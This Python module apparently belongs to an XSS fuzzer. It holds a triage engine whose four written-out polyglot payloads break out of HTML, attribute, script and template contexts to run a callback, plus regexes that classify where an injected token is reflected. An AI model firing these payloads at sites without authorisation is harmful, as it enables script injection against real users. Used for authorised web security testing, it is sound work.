"""Polyglot-First Triage Engine for Maximum Information Gain per Request.

Under strict rate limits (e.g. 30 req/min), spending 12-20 requests fuzzing individual
contexts is inefficient. Polyglot triage spends Request #1 on a multi-context mega-polyglot
that executes across HTML, Attribute, JS string, Template literal, Script close, and Comment
contexts simultaneously.

Outcomes:
1. Immediate Execution (Oracle HIT on Req #1): Saves 10-20 requests per parameter.
2. Reflection Residue (Canary present, no execution): Guides targeted grammar evolution.
3. Zero Reflection (Canary stripped/absent): Prunes parameter from budget immediately.
"""
import re
from typing import Any, Dict, List, Optional
from dataclasses import dataclass


@dataclass
class TriageResult:
    """Outcome of initial polyglot triage probe."""
    executed: bool
    reflected: bool
    reflection_count: int
    candidate_contexts: List[str]
    should_continue_fuzzing: bool
    recommended_strategy: str
    triage_notes: str


class PolyglotTriageEngine:
    """Generates and evaluates high-information-density triage polyglots."""

    # Mega-polyglot templates spanning HTML, attr, quotes, JS blocks, and comments
    TRIAGE_POLYGLOTS = [
        # 1. Somdev Sangwan (@s0md3v) Universal Multi-Context Polyglot (RCDATA / Raw Text / Attr / JS / Comment / SVG / Entity)
        "%0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover=\"/**/{CALLBACK}('{TOKEN}')//\">",
        # 2. Canonical multi-context polyglot (HTML / Attr / JS / Comment / SVG / Template)
        "-->'\"><script src=data:,{CALLBACK}('{TOKEN}')></script><svg onload={CALLBACK}('{TOKEN}')>\" onfocus={CALLBACK}('{TOKEN}') autofocus='`",
        # 3. Compact attribute and script breakout polyglot
        "'\">--></script><details open ontoggle={CALLBACK}('{TOKEN}')>\" onfocus={CALLBACK}('{TOKEN}') autofocus='",
        # 4. Template literal & JS string specialist polyglot
        "\"';{CALLBACK}('{TOKEN}');//</script><svg/onload={CALLBACK}('{TOKEN}')>`-{CALLBACK}('{TOKEN}')-"
    ]

    # Structural signatures that identify a rendered triage polyglot regardless of the token or
    # callback substituted in. Regular single-context grammar payloads never chain these breakouts,
    # so a match reliably means "this test case is the triage probe" — used to gate the feedback
    # loop in the worker and to prioritise the probe in the generator.
    TRIAGE_SIGNATURES = (
        "</template></noembed></noscript></style></title></textarea></script>",  # variant 1
        "<script src=data:,",                                                     # variant 2
        "<details open ontoggle=",                                                # variant 3
        "</script><svg/onload=",                                                  # variant 4
    )

    @classmethod
    def get_triage_payload(cls, token: str, callback_name: str = "__XSS__", variant: int = 0) -> str:
        """Render a mega-polyglot with the given verification token and callback."""
        template = cls.TRIAGE_POLYGLOTS[variant % len(cls.TRIAGE_POLYGLOTS)]
        return template.replace("{TOKEN}", token).replace("{CALLBACK}", callback_name)

    @classmethod
    def is_triage_payload(cls, payload: Optional[str]) -> bool:
        """True if ``payload`` is one of our rendered mega-polyglots.

        Signature-based (token/callback independent) so it survives the oracle-token rewrite the
        fuzzer applies before storing a test case. This is the single source of truth for "is this
        the triage probe?" — both the generator's priority boost and the worker's prune gate use it,
        replacing the stale ``/*__XSS_POLYGLOT__*/`` marker that no real template ever contained.
        """
        if not payload:
            return False
        return any(sig in payload for sig in cls.TRIAGE_SIGNATURES)

    @classmethod
    def evaluate_triage(
        cls,
        dom_snapshot: str,
        token: str,
        oracle_executed: bool
    ) -> TriageResult:
        """Evaluate the response from the polyglot probe to guide subsequent strategy."""
        if oracle_executed:
            return TriageResult(
                executed=True,
                reflected=True,
                reflection_count=dom_snapshot.count(token) if dom_snapshot else 1,
                candidate_contexts=["CONFIRMED_EXECUTION"],
                should_continue_fuzzing=False,  # Vulnerability already confirmed in 1 request!
                recommended_strategy="confirmed",
                triage_notes="Vulnerability confirmed on Request #1 via mega-polyglot triage."
            )

        if not dom_snapshot or token not in dom_snapshot:
            # Zero reflection: input is discarded or not returned in HTML
            return TriageResult(
                executed=False,
                reflected=False,
                reflection_count=0,
                candidate_contexts=[],
                should_continue_fuzzing=False,  # Prune dead parameter to save request budget
                recommended_strategy="prune",
                triage_notes="Token not reflected in DOM snapshot; pruning parameter to preserve rate budget."
            )

        # Token was reflected! Analyze residue to detect surviving contexts
        candidate_contexts: List[str] = []
        token_count = dom_snapshot.count(token)

        # Detect the *surviving* reflection contexts so the caller can fuzz only those grammars
        # and cancel the rest. Labels intentionally mirror PayloadGenerator.CONTEXT_GRAMMAR_MAP keys
        # so a residue verdict maps straight onto a grammar file. Order matters: the more specific
        tok = re.escape(token)
        if (
            re.search(rf'\bon\w+\s*=\s*"[^"]*{tok}', dom_snapshot, re.IGNORECASE)
            or re.search(rf"\bon\w+\s*=\s*'[^']*{tok}", dom_snapshot, re.IGNORECASE)
            or re.search(rf'\bon\w+\s*=\s*[^"\'\s>]*{tok}', dom_snapshot, re.IGNORECASE)
        ):
            candidate_contexts.append("EVENT_HANDLER_ATTR")
        if re.search(rf'=\s*["\'][^"\']*{tok}', dom_snapshot):
            candidate_contexts.append("ATTR_QUOTED")
        if re.search(rf'=\s*[^"\'\s>]*{tok}', dom_snapshot):
            candidate_contexts.append("ATTR_UNQUOTED")
        if re.search(rf'<script[^>]*>[^<]*{tok}', dom_snapshot, re.IGNORECASE):
            candidate_contexts.append("JS_STRING_LITERAL")
        if re.search(rf'`[^`]*{tok}', dom_snapshot):
            candidate_contexts.append("TEMPLATE_LITERAL")
        if re.search(rf'<!--[^\-]*{tok}', dom_snapshot):
            candidate_contexts.append("HTML_COMMENT")
        if re.search(rf'<style[^>]*>[^<]*{tok}', dom_snapshot, re.IGNORECASE):
            candidate_contexts.append("CSS_STYLE_BLOCK")
        if re.search(rf'>[^<]*{tok}[^<]*<', dom_snapshot):
            candidate_contexts.append("HTML_TEXT")

        # De-duplicate while preserving detection order.
        candidate_contexts = list(dict.fromkeys(candidate_contexts))
        if not candidate_contexts:
            candidate_contexts.append("HTML_TEXT")

        return TriageResult(
            executed=False,
            reflected=True,
            reflection_count=token_count,
            candidate_contexts=candidate_contexts,
            should_continue_fuzzing=True,
            recommended_strategy="genetic_evolutionary",
            triage_notes=f"Reflected ({token_count}x) across contexts: {', '.join(candidate_contexts)}. Proceeding to targeted mutation."
        )
